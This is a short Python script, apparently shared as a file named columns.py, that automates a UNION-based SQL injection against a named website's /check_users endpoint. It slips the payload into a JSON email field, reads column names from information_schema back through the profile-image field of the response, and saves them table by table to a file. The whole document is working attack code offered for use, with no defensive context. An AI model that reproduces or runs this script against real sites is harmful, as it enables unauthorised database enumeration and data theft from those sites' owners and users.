
import requests,json
headers={"cookie":"<COOKIES OF THE SITE HERE>"}
arr = []
def a(b,table_name):
	global j
	posts1 = {"0":{"email":"-lol@yeahnah.com'union select 1,2,3,(select column_name from information_schema.columns where table_schema=database() and table_name='"+table_name+"' limit "+str(b)+",1)-- -","name":"a"}}
	posts = {"users":json.dumps(posts1)}
	r = requests.post("https://www.yamumisfat.com/check_users",data=posts,headers=headers,allow_redirects=False)
	l = json.loads(r.text)[0]['profileimage']
	j = l.split("/")
	if j[-1] =="avatar-2.svg":
			print("-------Starting Another--------")
	else:
		s = open("columns.txt","a")
		s.write(table_name+" > "+j[-1]+"\n")
		s.close()
		print j[-1]
f = open("tables.txt","r")
ss = f.read()
f.close()
ss = ss.split("\n")
for s in ss:
	c=0
	print("-------Table "+s+"-------")
	while c<10000:
		a(c,s)
		if j[-1] =="avatar-2.svg":
			break
		c = c + 1
columns.py
Displaying columns.py.
